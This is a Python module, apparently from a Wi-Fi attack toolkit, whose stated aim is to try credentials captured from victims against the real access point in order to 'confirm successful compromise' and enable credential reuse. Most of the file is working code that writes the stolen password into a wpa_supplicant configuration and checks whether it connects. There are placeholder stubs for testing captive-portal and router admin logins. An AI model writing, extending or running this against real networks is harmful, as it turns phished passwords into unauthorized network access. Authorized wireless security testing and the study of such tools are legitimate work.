"""
Credential Auto-Testing
───────────────────────
Attempt captured credentials against the real AP to verify they work.
This confirms successful compromise and allows for credential reuse.

Test types:
1. Wi-Fi password test - connect to AP with captured password
2. HTTP portal test - submit credentials to captive portal
3. Admin panel test - attempt login to router admin interface
"""

import time
import threading
import subprocess
from collections import defaultdict

from .config import log


class CredentialTester:
    """
    Test captured credentials against real targets.

    Currently supports Wi-Fi password testing via wpa_supplicant on Linux.
    Can be extended to test HTTP portals and admin panels.
    """

    def __init__(self, interface):
        self.interface = interface
        self._results = defaultdict(list)  # (bssid, ssid) -> list of (user, pass, success)
        self._running = False
        self._thread = None

    def add_credentials(self, bssid, ssid, username, password):
        """Add credentials to test queue."""
        self._results[(bssid, ssid)].append((username, password))

    def test_wifi_password(self, bssid, ssid, password, timeout=15):
        """
        Test Wi-Fi password using wpa_supplicant.
        Returns True if connection succeeds.
        """
        if not password:
            return False

        log.info(f"Testing Wi-Fi password for {ssid} ({bssid})...")

        # Create temporary wpa_supplicant config
        config_path = f"/tmp/wpa_test_{int(time.time())}.conf"
        with open(config_path, "w") as f:
            f.write(f"ctrl_interface=/var/run/wpa_supplicant\n")
            f.write(f"ap_scan=1\n\n")
            f.write(f"network={{\n")
            f.write(f"    ssid=\"{ssid}\"\n")
            f.write(f"    psk=\"{password}\"\n")
            f.write(f"}}\n")

        # Try to connect
        try:
            # Reconfigure interface
            subprocess.run(
                ["iw", "dev", self.interface, "set", "type", "managed"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5
            )
            subprocess.run(
                ["ip", "link", "set", self.interface, "up"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5
            )

            # Start wpa_supplicant
            proc = subprocess.Popen(
                ["wpa_supplicant", "-i", self.interface, "-c", config_path, "-B"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

            # Wait for connection
            for _ in range(timeout):
                result = subprocess.run(
                    ["iwconfig", self.interface],
                    capture_output=True, text=True, timeout=5
                )
                if "IEEE 802.11" in result.stdout and "Not-Associated" not in result.stdout:
                    log.success(f"Wi-Fi password SUCCESS for {ssid}")
                    proc.terminate()
                    return True
                time.sleep(1)

            proc.terminate()
            log.warning(f"Wi-Fi password FAILED for {ssid}")
            return False

        except Exception as e:
            log.warning(f"Wi-Fi test error for {ssid}: {e}")
            return False
        finally:
            # Cleanup
            try:
                subprocess.run(["pkill", "wpa_supplicant"], stderr=subprocess.DEVNULL)
                import os
                os.remove(config_path)
            except Exception:
                pass

    def test_http_portal(self, bssid, ssid, username, password, url="http://10.0.0.1"):
        """
        Test HTTP portal credentials (placeholder for HTTP request).
        Implementation would use requests library to POST to captive portal.
        """
        log.info(f"HTTP portal test queued for {ssid}: {username}")
        # Implementation would be:
        # import requests
        # resp = requests.post(url, data={"username": username, "password": password})
        # return resp.status_code == 200
        return False

    def test_admin_panel(self, bssid, ssid, username, password, host="192.168.1.1"):
        """
        Test router admin panel credentials (placeholder).
        """
        log.info(f"Admin panel test queued for {bssid}: {username}")
        # Implementation would test common admin URLs
        return False

    def run_tests(self):
        """Run all credential tests in background."""
        self._running = True
        for (bssid, ssid), creds in self._results.items():
            for username, password in creds:
                if not self._running:
                    break
                # Test Wi-Fi password first (most common)
                success = self.test_wifi_password(bssid, ssid, password)
                if success:
                    log.critical(f"[SUCCESS] {ssid} - Password cracked: {password}")

    def start(self):
        if self._running:
            return
        self._thread = threading.Thread(target=self.run_tests, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)

    def get_stats(self):
        total = sum(len(c) for c in self._results.values())
        return {"total_credentials": total}
